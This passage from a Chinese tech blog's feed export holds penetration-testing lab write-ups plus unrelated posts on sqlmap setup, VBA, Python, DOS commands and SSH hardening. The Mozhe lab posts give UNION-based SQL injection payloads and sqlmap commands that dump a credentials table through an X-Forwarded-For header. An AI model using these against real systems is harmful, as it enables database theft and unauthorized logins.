<h2 id="查询数据库信息"><a href="#查询数据库信息" class="headerlink" title="查询数据库信息"></a>查询数据库信息</h2><ul>
<li>数据库名称、数据库版本、表名称<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,database(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--</span><br></pre></td></tr></table></figure>
获取到的信息：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库名称：pentesterlab</span><br><span class="line">数据库版本：10.2.15-MariaDB-log</span><br><span class="line">表名称：comment,flag,goods,user</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/1qgf"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image4dd2667f53288eb2.png" alt="image4dd2667f53288eb2.png"></a></li>
<li>获取表flag的信息<ul>
<li>表有两列：id,flag<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)--</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/1yGj"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image5403eaa8f44b34d8.png" alt="image5403eaa8f44b34d8.png"></a></li>
<li>表的内容：id=1,flag=flag is mozhe4a5966<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,id,flag from flag--</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/1FfQ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/imagefa4745c2daea3fd7.png" alt="imagefa4745c2daea3fd7.png"></a></li>
<li>获取key<br><a href="https://v2ray.dana5haw.com:8008/image/1SRu"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/13/image36d03060136ed58b.png" alt="image36d03060136ed58b.png"></a><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>参考这篇<a href="https://www.jianshu.com/p/7f3f8cba465a">教程</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>墨者靶场练习</tag>
        <tag>host头部注入</tag>
      </tags>
  </entry>
  <entry>
    <title>墨者靶场练习-X-Forwarded-For头注入</title>
    <url>//posts/ZH-CN/mozhe-xff-inject.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>练习X-Forwarded-For头注入，使用sqlmap进行注入。<br>自己注册一个墨者账号，就可以练习里面的在线靶场。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>登录后台提示ip信息不正确，这种情况一般是x-forwarded-for读取客户端ip，通过在数据包添加x-forwarded-for:1.1.1.1看 respone包中是否存在1.1.1.1，如果存在则证明用x-forwarded-for读取客户端数据，则存在注入漏洞，通过在登录框数据包中添加x-forwarded-for:*，用sqlmap跑注入,跑数据库名，表名，字段名，字段内容，登录后台获取key值。<br>以上原理讲解<a href="https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe">参考</a></p>
</blockquote>
<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><p>开启靶场：<a href="https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe</a><br><a href="https://v2ray.dana5haw.com:8008/image/1VVj"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image69150bf8bbef715b.png" alt="image69150bf8bbef715b.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/1gAQ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb3812ab303598871.png" alt="imageb3812ab303598871.png"></a><br>使用burp抓包，获取登录请求。<br><a href="https://v2ray.dana5haw.com:8008/image/1xbu"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image8ebc890c12551e5d.png" alt="image8ebc890c12551e5d.png"></a><br>添加X-Forwarded-For字段，设置为<code>127.0.0.1</code>进行测试：<br><a href="https://v2ray.dana5haw.com:8008/image/11Qc"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagefe8b1b470c361a7b.png" alt="imagefe8b1b470c361a7b.png"></a><br>将X-Forwarded-For字段的值设置为<code>127.0.0.1&#39;</code>，进行测试：<br><a href="https://v2ray.dana5haw.com:8008/image/1Icd"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagee5794c15c1063e4f.png" alt="imagee5794c15c1063e4f.png"></a><br>将X-Forwarded-For字段的值设置为<code>127.0.0.1*</code>，进行测试：<br><a href="https://v2ray.dana5haw.com:8008/image/1hKT"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image58be178f383de0f5.png" alt="image58be178f383de0f5.png"></a><br>以上测试结果，说明存在X-Forwarded-For注入点。（<strong>为什么？</strong>）</p>
<h2 id="使用sqlmap进行注入利用"><a href="#使用sqlmap进行注入利用" class="headerlink" title="使用sqlmap进行注入利用"></a>使用sqlmap进行注入利用</h2><p>将HTTP头存在txt文件，将txt放到sqlmap的根目录：<br><a href="https://v2ray.dana5haw.com:8008/image/1kBl"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imageb50f992d557e6239.png" alt="imageb50f992d557e6239.png"></a><br>txt文件的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 219.153.49.228:42875</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line">Origin: http://219.153.49.228:42875</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://219.153.49.228:42875/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: 127.0.0.1*</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=124</span><br></pre></td></tr></table></figure>
<ul>
<li>使用sqlmap，获取数据库名称：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt --dbs --batch</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/1ohU"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagef1058598a05de847.png" alt="imagef1058598a05de847.png"></a></li>
<li>获取数据库<code>webcalendar</code>的所有表名称：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -D webcalendar --tables --batch</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/13z8"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/image6a3e821399cdd099.png" alt="image6a3e821399cdd099.png"></a></li>
<li>获取表<code>user</code>的所有列数据<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt -D webcalendar -T user --dump --batch</span><br></pre></td></tr></table></figure>
<a href="https://v2ray.dana5haw.com:8008/image/1NiZ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/12/imagea5788d7df221f5a9.png" alt="imagea5788d7df221f5a9.png"></a><br>最后使用表中的用户名密码登录系统就行了。<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2>参考了这篇<a href="https://blog.csdn.net/SouthWind0/article/details/83348706">文章</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>墨者靶场练习</tag>
        <tag>X-Forwarded-For头注入</tag>
      </tags>
  </entry>
  <entry>
    <title>好玩的-识人标准参考</title>
    <url>//posts/ZH-CN/Think_Know_Others.html</url>
    <content><![CDATA[<h2 id="计算机领域识人参考"><a href="#计算机领域识人参考" class="headerlink" title="计算机领域识人参考"></a>计算机领域识人参考</h2><p>在<a href="https://liam.page/notes/">这个博客</a>看到的，说法很好玩。</p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzgsy1zkkj30tw0cy3zb.jpg" alt="image.png"></p>
<p>呵呵呵，这个函数画出来是一颗心。<br><code>17x^2-16|x|y+17y^2=225</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbzhsdgm4vj30b70bnt8z.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>行业思考</category>
      </categories>
      <tags>
        <tag>好玩的</tag>
        <tag>计算机领域识人标准</tag>
      </tags>
  </entry>
  <entry>
    <title>学习谷歌SEO（一）</title>
    <url>//posts/ZH-CN/Os_Tool.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>30天自制操作系统</tag>
        <tag>二进制编辑器</tag>
      </tags>
  </entry>
  <entry>
    <title>安全研发学习规划-记录</title>
    <url>//posts/ZH-CN/InfoSec_Study_Plan.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近，陷入知识焦虑。到底应该怎么学习，看看这些高手怎么说。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="学习规划"><a href="#学习规划" class="headerlink" title="学习规划"></a>学习规划</h2><h3 id="计算机理论"><a href="#计算机理论" class="headerlink" title="计算机理论"></a>计算机理论</h3><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><ul>
<li>基本使用</li>
<li>系统调用</li>
<li>进程</li>
<li>线程</li>
<li>内存管理</li>
<li>文件系统</li>
<li>可执行文件格式</li>
</ul>
<h4 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h4><ul>
<li>OSI七层模型</li>
<li>常见协议<ul>
<li>ARP</li>
<li>IP</li>
<li>TCP</li>
<li>UDP</li>
<li>HTTP</li>
<li>FTP</li>
<li>……</li>
</ul>
</li>
</ul>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><ul>
<li>常见关系型数据库<ul>
<li>SQL Server</li>
<li>MySQL</li>
<li>PostgreSQL</li>
<li>Oracle</li>
<li>SQLite</li>
</ul>
</li>
<li>非关系型数据库<ul>
<li>Mongodb</li>
<li>redis</li>
</ul>
</li>
<li>SQL基本操作<ul>
<li>Create</li>
<li>Drop</li>
<li>Insert</li>
<li>Select</li>
<li>Delete</li>
<li>Update</li>
</ul>
</li>
</ul>
<h4 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h4><ul>
<li>对称加密<ul>
<li>AES</li>
<li>DES</li>
</ul>
</li>
<li>非对称加密<ul>
<li>RAS</li>
<li>ECC</li>
</ul>
</li>
<li>信息摘要<ul>
<li>MD5</li>
<li>SHA1</li>
</ul>
</li>
</ul>
<h3 id="研发基础"><a href="#研发基础" class="headerlink" title="研发基础"></a>研发基础</h3><ul>
<li><p>编程语言</p>
<ul>
<li>C</li>
<li>C++</li>
<li>ASM</li>
<li>Java</li>
<li>PHP</li>
<li>Python</li>
<li>Javascript</li>
<li>HTML</li>
<li>CSS</li>
</ul>
</li>
<li><p>数据结构</p>
<ul>
<li>Stack</li>
<li>Queue</li>
<li>Hash table</li>
<li>Binary Tree</li>
<li>Multi Tree</li>
<li>Set</li>
<li>Map</li>
</ul>
</li>
<li><p>数据格式</p>
<ul>
<li>序列化及反序列化<ul>
<li>XML</li>
<li>JSON</li>
<li>YAML</li>
<li>ProtoBuf</li>
</ul>
</li>
</ul>
</li>
<li><p>算法</p>
<ul>
<li>排序<ul>
<li>冒泡排序</li>
<li>选择排序</li>
<li>快速排序</li>
</ul>
</li>
<li>查找<ul>
<li>二分</li>
<li>哈希</li>
<li>红黑树</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="安全相关的研发"><a href="#安全相关的研发" class="headerlink" title="安全相关的研发"></a>安全相关的研发</h3><ul>
<li>如何上手开始写安全软件<ul>
<li>熟悉一门编程语言的语法</li>
<li>熟悉这门语言的周边</li>
<li>读安全软件的代码</li>
<li>勤练手</li>
<li>要有自己的想法</li>
</ul>
</li>
<li>常用python模块<ul>
<li>requests 好用的http客户端</li>
<li>mitmproxy 好用的http代理框架</li>
<li>scrapy 好用的爬虫框架</li>
<li>scapy 好用的网络发包工具</li>
<li>beautifulsoup 好用的html解析工具</li>
<li>gevent 好用的协程工具</li>
</ul>
</li>
<li>Hook<ul>
<li>什么是Hook</li>
<li>为什么需要Hook</li>
<li>常见平台下的Hook技术</li>
<li>常见语言的Hook技术</li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>要学的东西太多，主要还是没有理论基础。看来得啃技术书籍。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ichunqiu.com/course/56939">i春秋视频</a></p>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>安全研发</tag>
        <tag>学习规划</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓模拟器无法进入adb_shell</title>
    <url>//posts/ZH-CN/Android_Adbshell.html</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>安卓模拟器无法进入adb_shell，报错信息为：<em>error: unkown host service</em></p>
<ul>
<li>进入adb_shell的方法<blockquote>
<p>以powershell进入安卓模拟器安装目录，执行.\adb.exe shell命令</p>
</blockquote>
</li>
</ul>
<p><escape> <span id="more"></span></escape></p>
<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>最终确认是由于电脑的5037端口被鲁大师占用，这种流氓软件就别装了吧，进程根本杀不死，只有暴力卸载掉咯。</p>
<ul>
<li>进入cmd命令行，查找端口占用情况<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano |findstr &quot;5037&quot;</span><br></pre></td></tr></table></figure>
举例：这个查找出来的结果意思是：占用5037端口的进程号是11060<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gawh21u8wkj30oi04cdft.jpg" alt="656_0.png"></li>
<li>进入任务管理器，查找该进程号对应的服务<br>举例：这是正常情况，占用5037端口的是adb服务。否则，把查找到的对应进程杀死，直到查出占用5037端口的服务是adb为止<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gawh3vnf5mj30n10kmq5a.jpg" alt="658_0.png"></li>
</ul>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.itread01.com/p/1348456.html">https://www.itread01.com/p/1348456.html</a></p>
]]></content>
      <categories>
        <category>安卓模拟器</category>
      </categories>
      <tags>
        <tag>安卓模拟器</tag>
        <tag>adb_shell</tag>
      </tags>
  </entry>
  <entry>
    <title>安装sqlmap</title>
    <url>//posts/ZH-CN/Sqlmap_Installation.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>windows10安装sqlmap。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a></p>
<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>在python的安装目录新建文件夹sqlmap，将安装包放到python的安装目录。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtlfyn81kj30or0o9tau.jpg" alt="image.png"></p>
<h3 id="创建快捷方式"><a href="#创建快捷方式" class="headerlink" title="创建快捷方式"></a>创建快捷方式</h3><p>创建cmd快捷方式：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtliq9hntj30lv0ggdg6.jpg" alt="image.png"><br>快捷方式命名：SQLMap<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtlka1i8ij30lv0gg0sz.jpg" alt="image.png"><br>起始位置：<code>E:\python3.8\sqlmap</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtlh5d1zpj30fw0m6t9c.jpg" alt="image.png"></p>
<h2 id="安装成功"><a href="#安装成功" class="headerlink" title="安装成功"></a>安装成功</h2><p>双击快捷方式，输入命令<code>sqlmap.py -h</code>查看安装是否成功。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbtllzvxjij30xz0hrq3s.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/baigoocn/article/details/51456721">https://blog.csdn.net/baigoocn/article/details/51456721</a></p>
]]></content>
      <categories>
        <category>安装教程</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>安装教程</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>将excel每行内容导出为单个文件并以特定列的内容作为文件名</title>
    <url>//posts/ZH-CN/excel-vba-convert.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了提高效率，我需要把excel每行的数据转存为单个文件。google告诉我可使用vba代码实现，就找到了一个简单方法，一个表转多个文件，一秒搞定。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="vba代码"><a href="#vba代码" class="headerlink" title="vba代码"></a>vba代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sub t()</span><br><span class="line">For i = 2 To 204 </span><br><span class="line">Open &quot;d:\&quot; &amp; Cells(i, 2) For Append As #1</span><br><span class="line">Print #1, Cells(i, 3)</span><br><span class="line">Close #1</span><br><span class="line">Next</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
<p>代码解释：<br>1、将第2行到第204行的数据转存为单个文件<br>2、打开D盘，每行内容以第二列数据作为文件名<br>3、打印第三列数据作为文件内容</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><a href="https://v2ray.dana5haw.com:8008/image/ZzoT"><img src="https://v2ray.dana5haw.com:8008/images/2020/06/16/image.png" alt="image.png"></a><br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/16/image318502281bf2ce85.png" alt="image318502281bf2ce85.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考<a href="https://zhidao.baidu.com/question/1860550641232376387.html?qbpn=1_1&fr=newsearchlist&word=%E5%A6%82%E4%BD%95%E6%8A%8Aexcel%E6%AF%8F%E4%B8%80%E8%A1%8C%E5%90%84%E5%AF%BC%E5%87%BA%E4%B8%BA%E4%B8%80%E4%B8%AAtxt%E6%96%87%E6%9C%AC%2C%E5%B9%B6%E4%B8%94%E4%BB%A5%E5%AF%B9%E5%BA%94%E6%AF%8F%E8%A1%8C%E7%9A%84%E6%A0%87%E9%A2%98%E5%91%BD%E5%90%8D&aup=1">这篇文章</a></p>
]]></content>
      <categories>
        <category>excel</category>
        <category>vba编程</category>
      </categories>
      <tags>
        <tag>excel</tag>
        <tag>vba代码</tag>
        <tag>excel每行数据转存为单个文件</tag>
      </tags>
  </entry>
  <entry>
    <title>将多个文件内容合并为一个excel，一行写一个文件</title>
    <url>//posts/ZH-CN/file-to-excel-python.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理NG配置文件，每次都去服务器上面去查，很不方便，有时候因为网络限制根本登录不到服务器。于是，就想把服务器的NG配置文件拷贝到本地，集中整理为一张表，就看这张表查各个系统的具体配置。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8-*- #</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line">book = xlwt.Workbook(encoding=<span class="string">&#x27;GBK&#x27;</span>,style_compression=<span class="number">0</span>)</span><br><span class="line">sheet = book.add_sheet(<span class="string">&#x27;XX&#x27;</span>, cell_overwrite_ok=<span class="literal">True</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;所属NG&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&#x27;配置文件名称&#x27;</span>)</span><br><span class="line">sheet.write(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&#x27;配置文件内容&#x27;</span>) </span><br><span class="line"></span><br><span class="line">path = <span class="string">r&quot;D:\XX-conf&quot;</span> <span class="comment">#文件夹目录</span></span><br><span class="line">files= os.listdir(path) <span class="comment">#得到文件夹下的所有文件名称</span></span><br><span class="line"></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">q=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file): <span class="comment">#判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">        fd = <span class="built_in">open</span>(path+<span class="string">&quot;/&quot;</span>+file); <span class="comment">#打开文件</span></span><br><span class="line">        lines = fd.readlines()</span><br><span class="line">        string = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            string += line <span class="comment">#配置文件内容</span></span><br><span class="line">        sheet.write(a, <span class="number">0</span>, <span class="string">&#x27;XX&#x27;</span>)</span><br><span class="line">        sheet.write(a, <span class="number">2</span>, string)</span><br><span class="line">        a = a+<span class="number">1</span></span><br><span class="line">    sheet.write(q,<span class="number">1</span>,file)  </span><br><span class="line">    q=q+<span class="number">1</span> </span><br><span class="line">book.save(<span class="string">&#x27;XX-conf.xls&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://v2ray.dana5haw.com:8008/images/2020/06/17/imaged721828f323959f2.png" alt="imaged721828f323959f2.png"></p>
]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
      <tags>
        <tag>excel</tag>
        <tag>python</tag>
        <tag>文件转excel</tag>
      </tags>
  </entry>
  <entry>
    <title>工具（editplus）-批量修改文件编码格式</title>
    <url>//posts/ZH-CN/tool-editplus-file-encoding.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有些csv文件导出来，编码格式不对（unicode编码比较不容易踩雷，其他编码格式用excel打开很可能是乱码）。经常会分析并统计多个csv数据源，能批量修改csv文件的编码格式就好了。editplus这个工具就可以帮助我们进行批量修改。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="下载editplus"><a href="#下载editplus" class="headerlink" title="下载editplus"></a>下载editplus</h2><p>试了一下自己搭建的离线下载服务（aria2），很好用！下载速度很快，文件下载到vps之后，自动上传到onedrive网盘，并且自动删除vps上的下载内容，不占用vps的磁盘空间。我的电脑和onedrive是同步的，所以下载的文件就直接同步到电脑端，不需要再去手动拉取文件。<br><a href="https://www.editplus.com/ftp.php?n=epp530_2542_64bit.exe">下载链接</a><br>双击这个可执行程序，傻瓜式安装即可。</p>
<h2 id="批量更改csv编码格式"><a href="#批量更改csv编码格式" class="headerlink" title="批量更改csv编码格式"></a>批量更改csv编码格式</h2><p>参考<a href="https://blog.csdn.net/x30465947/article/details/79723757">这篇文章</a><br>我们在excel导入csv数据源的时候也可以修改csv的编码格式：<br><a href="https://v2ray.dana5haw.com:8008/image/gqpG"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image155de20316ba19ab.png" alt="image155de20316ba19ab.png"></a><br>但是这样稍显麻烦，我们可以用editplus批量修改多个csv文件的编码格式。<br>点击【File】——&gt;【Open】可同时打开多个文件：<br><a href="https://v2ray.dana5haw.com:8008/image/gS1f"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imagecabd9caa81712985.png" alt="imagecabd9caa81712985.png"></a><br>点击【Document】——&gt;【File Encoding】——&gt;【Convert Encoding Multiple……】可批量将编码格式转为指定格式：<br><a href="https://v2ray.dana5haw.com:8008/image/gWnj"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image22b7cbdc8d752473.png" alt="image22b7cbdc8d752473.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/giyQ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/imaged6766418e1f1dfa5.png" alt="imaged6766418e1f1dfa5.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/grDu"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/02/image1d109cd16ba7d8f7.png" alt="image1d109cd16ba7d8f7.png"></a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考<a href="https://blog.csdn.net/x30465947/article/details/79723757">这篇文章</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>editplus</tag>
        <tag>批量修改文件编码格式</tag>
      </tags>
  </entry>
  <entry>
    <title>常用DOS命令</title>
    <url>//posts/ZH-CN/DOS_Cmd.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然日常用windows电脑，但是对于DOS命令操作并没有比对linux系统的命令行操作更熟悉，有点尴尬🙃</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h2><h3 id="查看操作"><a href="#查看操作" class="headerlink" title="查看操作"></a>查看操作</h3><ul>
<li>查看文件内容：<ul>
<li><code>type [文件名]</code></li>
<li><code>more [文件名]</code></li>
</ul>
</li>
<li>查看目录内容：<code>dir [目录名]</code></li>
</ul>
<h3 id="创建操作"><a href="#创建操作" class="headerlink" title="创建操作"></a>创建操作</h3><ul>
<li><p>创建文件：</p>
<ul>
<li><code>copy con [文件名]</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcz7w4loj2j30xz0hrta3.jpg" alt="image.png"></li>
<li><code>echo 内容 &gt; [文件名]</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcz84n2h63j30fp09kaa8.jpg" alt="image.png"></li>
</ul>
</li>
<li><p>创建目录：<code>md [目录名]</code></p>
</li>
<li><p>复制文件：<code>copy [文件名] [新文件名]</code></p>
</li>
</ul>
<h3 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h3><ul>
<li>删除文件：<code>del [文件名]</code></li>
<li>删除空目录：<code>rd [目录名]</code></li>
</ul>
<h3 id="重命名操作"><a href="#重命名操作" class="headerlink" title="重命名操作"></a>重命名操作</h3><ul>
<li>重命名文件（夹）：<code>ren [文件（夹）名] [新文件（夹）名]</code></li>
</ul>
<h3 id="批处理文件"><a href="#批处理文件" class="headerlink" title="批处理文件"></a>批处理文件</h3><p>批处理文件的后缀名是<code>bat</code>。比如我们可以创建批处理文件在当前目录调用命令行窗口。<br>批处理文件内容：<code>cmd.exe</code>。对，就写这几个字就能够调出命令行窗口。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcz89c21q3j30qa0ctmxq.jpg" alt="image.png"><br>我们也可以在bat文件中写入其他程序，双击bat文件即可调用。比如我在bat文件里面写入<code>D:\tools\cmder\Cmder.exe</code>，双击bat脚本就会调出Cmder的命令行窗口。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcz8hjburdj30qq0kh0uy.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>多练习使用，熟悉操作。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/zutsoft/article/details/9948707">参考文章</a></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>DOS命令</tag>
      </tags>
  </entry>
  <entry>
    <title>开启ssh服务导致v2ray服务器遭暴力破解</title>
    <url>//posts/ZH-CN/V2ray_Bruteforce.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>万万没想到，互联网的攻击这么多，离我这么近。刚创建的服务器，就遭到暴力破解。还好发现得早。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p>本来是想找一下，用户的访问日志放在了服务器的哪个位置，结果从日志<code>/var/log/auth.log</code>中发现服务器被暴力攻击，许多扫描器在尝试破解root密码。那还得了？！<br>本来想说明一下这些扫描器是有多猖獗，结果图片被挂了……<br>确实ssh服务用默认的22端口太危险了，果断改端口，改到5位数。修改配置文件<code>/etc/ssh/sshd_config</code>，改掉<code>Port</code>的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcxacmi25kj30h50idmye.jpg" alt="image.png"><br>保存修改之后，重启ssh服务。</p>
